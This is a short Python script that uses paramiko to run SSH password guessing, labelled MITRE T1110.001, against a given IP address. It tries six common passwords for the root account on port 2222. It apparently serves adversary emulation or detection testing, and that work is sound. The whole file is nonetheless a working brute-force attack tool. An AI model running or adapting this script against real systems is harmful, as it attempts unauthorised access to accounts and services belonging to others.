import paramiko
import time
import sys

def attack():
    if len(sys.argv) != 2:
        print("Usage: python3 mitre_t1110.py <10.60.220.36>")
        sys.exit(1)

    ip = sys.argv[1]
    print(f"[*] Launching MITRE T1110.001 (Password Guessing) against {ip}...")
    passwords = ["123456", "password", "admin", "root", "toor", "qwerty"]

    for p in passwords:
        print(f"[*] Trying password: {p}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=2222, username="root", password=p, timeout=3)
        except Exception as e:
            print(f"[-] Failed: {e}")
        time.sleep(1)

if __name__ == "__main__":
    attack()
